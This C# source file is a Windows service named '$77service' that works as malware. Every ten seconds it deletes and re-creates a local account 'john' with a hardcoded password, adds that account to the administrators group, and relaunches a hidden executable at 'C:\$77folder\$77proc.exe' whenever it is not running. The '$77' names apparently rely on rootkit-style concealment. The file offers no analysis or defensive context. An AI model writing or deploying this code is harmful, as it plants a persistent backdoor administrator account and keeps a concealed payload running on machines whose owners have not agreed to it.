using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace WindowsService
{
    public partial class Service1 : ServiceBase
    {
        System.Timers.Timer Timer = new System.Timers.Timer();
        int Interval = 10000; // 10000 ms = 10 second  
        public Service1()
        {
            InitializeComponent();
            this.ServiceName = "$77service";
        }

        protected override void OnStart(string[] args)
        {
            Timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            Timer.Interval = Interval;
            Timer.Enabled = true;
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
                        Process b = Process.Start("cmd.exe", "/c net user john /delete");
                        b.WaitForExit();
                        b.Close();
                        Process c = Process.Start("cmd.exe", "/c net user john asdf123? /add");
                        c.WaitForExit();
                        c.Close();
                        Process d = Process.Start("cmd.exe", "/c net localgroup administrators john /add");
                        d.WaitForExit();
                        d.Close();
                        string processName = "$77proc";
                        bool isRunning = IsProcessRunning(processName);
                        if (isRunning)
                        {
                            
                        }
                        else
                        {
                            Process ef = Process.Start("C:\\$77folder\\$77proc.exe");
                        }
        }
        static bool IsProcessRunning(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);

            return (processes.Length > 0);
        }
        protected override void OnStop()
        {
            Timer.Stop();
        }
    }
}
